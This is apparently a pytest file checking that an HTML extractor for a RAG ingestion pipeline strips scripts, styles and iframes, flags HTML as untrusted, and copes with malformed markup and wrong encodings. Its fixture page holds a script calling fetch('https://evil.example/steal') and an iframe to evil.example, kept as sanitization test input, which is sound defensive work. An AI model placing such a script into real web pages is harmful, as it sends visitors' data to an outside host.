"""Tests extracteur HTML (sanitization, malformé, encodage, pas d'I/O réseau)."""
from apps.rag_core.services.ingest.extraction import extract_document
from apps.rag_core.services.ingest.extraction.base import BlockType

PAGE = """<!DOCTYPE html>
<html><head>
  <title>Ma Page</title>
  <style>body{color:red}</style>
  <script>fetch('https://evil.example/steal')</script>
</head>
<body>
  <nav>Accueil Menu Contact</nav>
  <h1>Titre principal</h1>
  <p>Premier paragraphe utile.</p>
  <ul><li>point 1</li><li>point 2</li></ul>
  <table><tr><td>c1</td><td>c2</td></tr></table>
  <iframe src="https://evil.example"></iframe>
  <footer>mentions légales</footer>
</body></html>"""


class TestHtml:
    def test_nominal_title_and_paragraph(self):
        r = extract_document(PAGE.encode(), filename="p.html")
        assert r.status.value == "success"
        assert r.metadata.get("html_title") == "Ma Page"
        assert "Titre principal" in r.text
        assert "Premier paragraphe utile." in r.text

    def test_scripts_styles_removed(self):
        r = extract_document(PAGE.encode(), filename="p.html")
        assert "fetch(" not in r.text
        assert "color:red" not in r.text
        assert "evil.example" not in r.text
        assert "active_content_removed" in r.warnings

    def test_treated_as_untrusted_flag(self):
        r = extract_document(PAGE.encode(), filename="p.html")
        assert "html_treated_as_untrusted" in r.warnings

    def test_tables_and_lists(self):
        r = extract_document(PAGE.encode(), filename="p.html")
        assert "point 1" in r.text
        assert "c1" in r.text

    def test_malformed_does_not_crash(self):
        bad = b"<html><body><p>incomplet <b>gras <ul><li>x</body"
        r = extract_document(bad, filename="bad.html")
        assert "gras" in r.text  # extraction tolérante

    def test_wrong_declared_encoding(self):
        # octets latin-1 avec charset déclaré faux -> pas de crash
        data = "<html><body><p>Éléphant à Noël</p></body></html>".encode("latin-1")
        r = extract_document(data, filename="e.html", content_type="text/html; charset=utf-8")
        assert "phant" in r.text
